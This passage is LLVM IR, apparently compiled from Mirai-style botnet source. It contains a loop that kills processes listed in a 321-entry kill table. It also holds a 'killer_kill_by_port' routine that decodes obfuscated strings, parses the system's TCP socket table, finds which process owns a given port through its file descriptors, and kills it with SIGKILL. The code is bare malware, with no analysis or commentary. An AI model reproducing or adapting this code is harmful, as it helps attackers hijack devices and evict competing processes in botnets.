  store i32 0, i32* @i, align 4
  br label %2

2:                                                ; preds = %12, %0
  %3 = load i32, i32* @i, align 4
  %4 = sext i32 %3 to i64
  %5 = icmp ult i64 %4, 321
  br i1 %5, label %6, label %15

6:                                                ; preds = %2
  %7 = load i32, i32* @i, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [321 x i8*], [321 x i8*]* @KillStructure, i64 0, i64 %8
  %10 = load i8*, i8** %9, align 8
  call void @killerkillbyname(i8* %10)
  %11 = call i32 @usleep(i32 100)
  br label %12

12:                                               ; preds = %6
  %13 = load i32, i32* @i, align 4
  %14 = add nsw i32 %13, 1
  store i32 %14, i32* @i, align 4
  br label %2, !llvm.loop !8

15:                                               ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() #3

declare i32 @usleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local signext i8 @killer_kill_by_port(i16 zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i16, align 2
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca %struct.__dirstream*, align 8
  %6 = alloca %struct.dirent*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca [4096 x i8], align 16
  %9 = alloca [4096 x i8], align 16
  %10 = alloca [513 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [16 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca [16 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  store i16 %0, i16* %3, align 2
  %24 = bitcast [4096 x i8]* %8 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %24, i8 0, i64 4096, i1 false)
  %25 = bitcast [4096 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %25, i8 0, i64 4096, i1 false)
  %26 = bitcast [513 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %26, i8 0, i64 513, i1 false)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %27 = bitcast [16 x i8]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %27, i8 0, i64 16, i1 false)
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  store i8* %28, i8** %14, align 8
  store i32 0, i32* %15, align 4
  %29 = load i16, i16* %3, align 2
  %30 = call zeroext i16 @ntohs(i16 zeroext %29) #8
  %31 = zext i16 %30 to i32
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %33 = call i8* @util_itoa(i32 %31, i32 16, i8* %32)
  %34 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %35 = call i32 @util_strlen(i8* %34)
  %36 = icmp eq i32 %35, 2
  br i1 %36, label %37, label %47

37:                                               ; preds = %1
  %38 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %39 = load i8, i8* %38, align 16
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 2
  store i8 %39, i8* %40, align 2
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 3
  store i8 %42, i8* %43, align 1
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 4
  store i8 0, i8* %44, align 4
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %45, align 16
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  store i8 48, i8* %46, align 1
  br label %47

47:                                               ; preds = %37, %1
  call void @table_unlock_val(i8 zeroext 15)
  call void @table_unlock_val(i8 zeroext 16)
  call void @table_unlock_val(i8 zeroext 17)
  call void @table_unlock_val(i8 zeroext 19)
  %48 = call i8* @table_retrieve_val(i32 19, i32* null)
  %49 = call i32 (i8*, i32, ...) @open(i8* %48, i32 0)
  store i32 %49, i32* %12, align 4
  %50 = load i32, i32* %12, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  store i8 0, i8* %2, align 1
  br label %375

53:                                               ; preds = %47
  br label %54

54:                                               ; preds = %222, %215, %184, %86, %53
  %55 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 0
  %56 = load i32, i32* %12, align 4
  %57 = call i8* @util_fdgets(i8* %55, i32 512, i32 %56)
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %223

59:                                               ; preds = %54
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %60

60:                                               ; preds = %76, %59
  %61 = load i32, i32* %17, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %74

67:                                               ; preds = %60
  %68 = load i32, i32* %17, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp ne i32 %72, 58
  br label %74

74:                                               ; preds = %67, %60
  %75 = phi i1 [ false, %60 ], [ %73, %67 ]
  br i1 %75, label %76, label %79

76:                                               ; preds = %74
  %77 = load i32, i32* %17, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %17, align 4
  br label %60, !llvm.loop !9

79:                                               ; preds = %74
  %80 = load i32, i32* %17, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %87

86:                                               ; preds = %79
  br label %54, !llvm.loop !10

87:                                               ; preds = %79
  %88 = load i32, i32* %17, align 4
  store i32 %88, i32* %18, align 4
  br label %89

89:                                               ; preds = %105, %87
  %90 = load i32, i32* %17, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %91
  %93 = load i8, i8* %92, align 1
  %94 = sext i8 %93 to i32
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %103

96:                                               ; preds = %89
  %97 = load i32, i32* %17, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = icmp ne i32 %101, 32
  br label %103

103:                                              ; preds = %96, %89
  %104 = phi i1 [ false, %89 ], [ %102, %96 ]
  br i1 %104, label %105, label %108

105:                                              ; preds = %103
  %106 = load i32, i32* %17, align 4
  %107 = add nsw i32 %106, 1
  store i32 %107, i32* %17, align 4
  br label %89, !llvm.loop !11

108:                                              ; preds = %103
  %109 = load i32, i32* %17, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %17, align 4
  %111 = sext i32 %109 to i64
  %112 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %111
  store i8 0, i8* %112, align 1
  %113 = load i32, i32* %17, align 4
  %114 = add nsw i32 %113, 2
  store i32 %114, i32* %17, align 4
  %115 = load i32, i32* %18, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %116
  %118 = load i32, i32* %18, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %119
  %121 = call i32 @util_strlen(i8* %120)
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %123 = call i32 @util_stristr(i8* %117, i32 %121, i8* %122)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %125, label %222

125:                                              ; preds = %108
  store i32 0, i32* %19, align 4
  store i8 0, i8* %20, align 1
  store i8 0, i8* %21, align 1
  br label %126

126:                                              ; preds = %178, %125
  %127 = load i32, i32* %19, align 4
  %128 = icmp slt i32 %127, 7
  br i1 %128, label %129, label %137

129:                                              ; preds = %126
  %130 = load i32, i32* %17, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %17, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = icmp ne i32 %135, 0
  br label %137

137:                                              ; preds = %129, %126
  %138 = phi i1 [ false, %126 ], [ %136, %129 ]
  br i1 %138, label %139, label %179

139:                                              ; preds = %137
  %140 = load i32, i32* %17, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = sext i8 %143 to i32
  %145 = icmp eq i32 %144, 32
  br i1 %145, label %153, label %146

146:                                              ; preds = %139
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = icmp eq i32 %151, 9
  br i1 %152, label %153, label %154

153:                                              ; preds = %146, %139
  store i8 1, i8* %20, align 1
  br label %178

154:                                              ; preds = %146
  %155 = load i8, i8* %20, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %19, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %19, align 4
  br label %161

161:                                              ; preds = %158, %154
  %162 = load i8, i8* %20, align 1
  %163 = sext i8 %162 to i32
  %164 = icmp eq i32 %163, 1
  br i1 %164, label %165, label %177

165:                                              ; preds = %161
  %166 = load i32, i32* %19, align 4
  %167 = icmp eq i32 %166, 1
  br i1 %167, label %168, label %177

168:                                              ; preds = %165
  %169 = load i32, i32* %17, align 4
  %170 = add nsw i32 %169, 1
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 65
  br i1 %175, label %176, label %177

176:                                              ; preds = %168
  store i8 1, i8* %21, align 1
  br label %177

177:                                              ; preds = %176, %168, %165, %161
  store i8 0, i8* %20, align 1
  br label %178

178:                                              ; preds = %177, %153
  br label %126, !llvm.loop !12

179:                                              ; preds = %137
  %180 = load i32, i32* %17, align 4
  store i32 %180, i32* %18, align 4
  %181 = load i8, i8* %21, align 1
  %182 = sext i8 %181 to i32
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %185

184:                                              ; preds = %179
  br label %54, !llvm.loop !10

185:                                              ; preds = %179
  br label %186

186:                                              ; preds = %202, %185
  %187 = load i32, i32* %17, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = sext i8 %190 to i32
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %193, label %200

193:                                              ; preds = %186
  %194 = load i32, i32* %17, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %195
  %197 = load i8, i8* %196, align 1
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 32
  br label %200

200:                                              ; preds = %193, %186
  %201 = phi i1 [ false, %186 ], [ %199, %193 ]
  br i1 %201, label %202, label %205

202:                                              ; preds = %200
  %203 = load i32, i32* %17, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %17, align 4
  br label %186, !llvm.loop !13

205:                                              ; preds = %200
  %206 = load i32, i32* %17, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %17, align 4
  %208 = sext i32 %206 to i64
  %209 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = load i32, i32* %18, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %211
  %213 = call i32 @util_strlen(i8* %212)
  %214 = icmp sgt i32 %213, 15
  br i1 %214, label %215, label %216

215:                                              ; preds = %205
  br label %54, !llvm.loop !10

216:                                              ; preds = %205
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %218 = load i32, i32* %18, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %219
  %221 = call i32 @util_strcpy(i8* %217, i8* %220)
  br label %223

222:                                              ; preds = %108
  br label %54, !llvm.loop !10

223:                                              ; preds = %216, %54
  %224 = load i32, i32* %12, align 4
  %225 = call i32 @close(i32 %224)
  %226 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %227 = call i32 @util_strlen(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %230

229:                                              ; preds = %223
  call void @table_lock_val(i8 zeroext 15)
  call void @table_lock_val(i8 zeroext 16)
  call void @table_lock_val(i8 zeroext 17)
  call void @table_lock_val(i8 zeroext 19)
  store i8 0, i8* %2, align 1
  br label %375

230:                                              ; preds = %223
  %231 = call i8* @table_retrieve_val(i32 15, i32* null)
  %232 = call %struct.__dirstream* @opendir(i8* %231)
  store %struct.__dirstream* %232, %struct.__dirstream** %4, align 8
  %233 = icmp ne %struct.__dirstream* %232, null
  br i1 %233, label %234, label %371

234:                                              ; preds = %230
  br label %235

235:                                              ; preds = %367, %280, %257, %234
  %236 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %237 = call %struct.dirent* @readdir(%struct.__dirstream* %236)
  store %struct.dirent* %237, %struct.dirent** %6, align 8
  %238 = icmp ne %struct.dirent* %237, null
  br i1 %238, label %239, label %242

239:                                              ; preds = %235
  %240 = load i32, i32* %15, align 4
  %241 = icmp eq i32 %240, 0
  br label %242

242:                                              ; preds = %239, %235
  %243 = phi i1 [ false, %235 ], [ %241, %239 ]
  br i1 %243, label %244, label %368

244:                                              ; preds = %242
  %245 = load %struct.dirent*, %struct.dirent** %6, align 8
  %246 = getelementptr inbounds %struct.dirent, %struct.dirent* %245, i32 0, i32 4
  %247 = getelementptr inbounds [256 x i8], [256 x i8]* %246, i64 0, i64 0
  store i8* %247, i8** %22, align 8
  %248 = load i8*, i8** %22, align 8
  %249 = load i8, i8* %248, align 1
  %250 = sext i8 %249 to i32
  %251 = icmp slt i32 %250, 48
  br i1 %251, label %257, label %252

252:                                              ; preds = %244
  %253 = load i8*, i8** %22, align 8
  %254 = load i8, i8* %253, align 1
  %255 = sext i8 %254 to i32
  %256 = icmp sgt i32 %255, 57
  br i1 %256, label %257, label %258

257:                                              ; preds = %252, %244
  br label %235, !llvm.loop !14

258:                                              ; preds = %252
  %259 = load i8*, i8** %14, align 8
  %260 = call i8* @table_retrieve_val(i32 15, i32* null)
  %261 = call i32 @util_strcpy(i8* %259, i8* %260)
  %262 = load i8*, i8** %14, align 8
  %263 = load i8*, i8** %14, align 8
  %264 = call i32 @util_strlen(i8* %263)
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8, i8* %262, i64 %265
  %267 = load i8*, i8** %22, align 8
  %268 = call i32 @util_strcpy(i8* %266, i8* %267)
  %269 = load i8*, i8** %14, align 8
  %270 = load i8*, i8** %14, align 8
  %271 = call i32 @util_strlen(i8* %270)
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8, i8* %269, i64 %272
  %274 = call i8* @table_retrieve_val(i32 16, i32* null)
  %275 = call i32 @util_strcpy(i8* %273, i8* %274)
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %278 = call i64 @readlink(i8* %276, i8* %277, i64 4096) #7
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

280:                                              ; preds = %258
  br label %235, !llvm.loop !14

281:                                              ; preds = %258
  %282 = load i8*, i8** %14, align 8
  %283 = call i8* @table_retrieve_val(i32 15, i32* null)
  %284 = call i32 @util_strcpy(i8* %282, i8* %283)
  %285 = load i8*, i8** %14, align 8
  %286 = load i8*, i8** %14, align 8
  %287 = call i32 @util_strlen(i8* %286)
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds i8, i8* %285, i64 %288
  %290 = load i8*, i8** %22, align 8
  %291 = call i32 @util_strcpy(i8* %289, i8* %290)
  %292 = load i8*, i8** %14, align 8
  %293 = load i8*, i8** %14, align 8
  %294 = call i32 @util_strlen(i8* %293)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8, i8* %292, i64 %295
  %297 = call i8* @table_retrieve_val(i32 17, i32* null)
  %298 = call i32 @util_strcpy(i8* %296, i8* %297)
  %299 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %300 = call %struct.__dirstream* @opendir(i8* %299)
  store %struct.__dirstream* %300, %struct.__dirstream** %5, align 8
  %301 = icmp ne %struct.__dirstream* %300, null
  br i1 %301, label %302, label %367

302:                                              ; preds = %281
  br label %303

303:                                              ; preds = %363, %351, %302
  %304 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %305 = call %struct.dirent* @readdir(%struct.__dirstream* %304)
  store %struct.dirent* %305, %struct.dirent** %7, align 8
  %306 = icmp ne %struct.dirent* %305, null
  br i1 %306, label %307, label %310

307:                                              ; preds = %303
  %308 = load i32, i32* %15, align 4
  %309 = icmp eq i32 %308, 0
  br label %310

310:                                              ; preds = %307, %303
  %311 = phi i1 [ false, %303 ], [ %309, %307 ]
  br i1 %311, label %312, label %364

312:                                              ; preds = %310
  %313 = load %struct.dirent*, %struct.dirent** %7, align 8
  %314 = getelementptr inbounds %struct.dirent, %struct.dirent* %313, i32 0, i32 4
  %315 = getelementptr inbounds [256 x i8], [256 x i8]* %314, i64 0, i64 0
  store i8* %315, i8** %23, align 8
  %316 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @util_zero(i8* %316, i32 4096)
  %317 = load i8*, i8** %14, align 8
  %318 = call i8* @table_retrieve_val(i32 15, i32* null)
  %319 = call i32 @util_strcpy(i8* %317, i8* %318)
  %320 = load i8*, i8** %14, align 8
  %321 = load i8*, i8** %14, align 8
  %322 = call i32 @util_strlen(i8* %321)
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8, i8* %320, i64 %323
  %325 = load i8*, i8** %22, align 8
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  %327 = load i8*, i8** %14, align 8
  %328 = load i8*, i8** %14, align 8
  %329 = call i32 @util_strlen(i8* %328)
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8, i8* %327, i64 %330
  %332 = call i8* @table_retrieve_val(i32 17, i32* null)
  %333 = call i32 @util_strcpy(i8* %331, i8* %332)
  %334 = load i8*, i8** %14, align 8
  %335 = load i8*, i8** %14, align 8
  %336 = call i32 @util_strlen(i8* %335)
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8, i8* %334, i64 %337
  %339 = call i32 @util_strcpy(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i64 0, i64 0))
  %340 = load i8*, i8** %14, align 8
  %341 = load i8*, i8** %14, align 8
  %342 = call i32 @util_strlen(i8* %341)
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %340, i64 %343
  %345 = load i8*, i8** %23, align 8
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %349 = call i64 @readlink(i8* %347, i8* %348, i64 4096) #7
  %350 = icmp eq i64 %349, -1
  br i1 %350, label %351, label %352

351:                                              ; preds = %312
  br label %303, !llvm.loop !15

352:                                              ; preds = %312
  %353 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %354 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %355 = call i32 @util_strlen(i8* %354)
  %356 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %357 = call i32 @util_stristr(i8* %353, i32 %355, i8* %356)
  %358 = icmp ne i32 %357, -1
  br i1 %358, label %359, label %363

359:                                              ; preds = %352
  %360 = load i8*, i8** %22, align 8
  %361 = call i32 @util_atoi(i8* %360, i32 10)
  %362 = call i32 @kill(i32 %361, i32 9) #7
  store i32 1, i32* %15, align 4
  br label %363

363:                                              ; preds = %359, %352
  br label %303, !llvm.loop !15

364:                                              ; preds = %310
  %365 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %366 = call i32 @closedir(%struct.__dirstream* %365)
  br label %367

367:                                              ; preds = %364, %281
  br label %235, !llvm.loop !14

368:                                              ; preds = %242
  %369 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %370 = call i32 @closedir(%struct.__dirstream* %369)
  br label %371

371:                                              ; preds = %368, %230
  %372 = call i32 @sleep(i32 1)
  call void @table_lock_val(i8 zeroext 15)
  call void @table_lock_val(i8 zeroext 16)
  call void @table_lock_val(i8 zeroext 17)
  %373 = load i32, i32* %15, align 4
  %374 = trunc i32 %373 to i8
  store i8 %374, i8* %2, align 1
  br label %375

375:                                              ; preds = %371, %229, %52
  %376 = load i8, i8* %2, align 1
  ret i8 %376
}

declare i8* @util_itoa(i32, i32, i8*) #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #5

declare i32 @util_strlen(i8*) #1

declare i8* @util_fdgets(i8*, i32, i32) #1

declare i32 @util_stristr(i8*, i32, i8*) #1

; Function Attrs: nounwind
declare i64 @readlink(i8*, i8*, i64) #3

declare void @util_zero(i8*, i32) #1

declare i32 @util_atoi(i8*, i32) #1

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind readonly willreturn }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
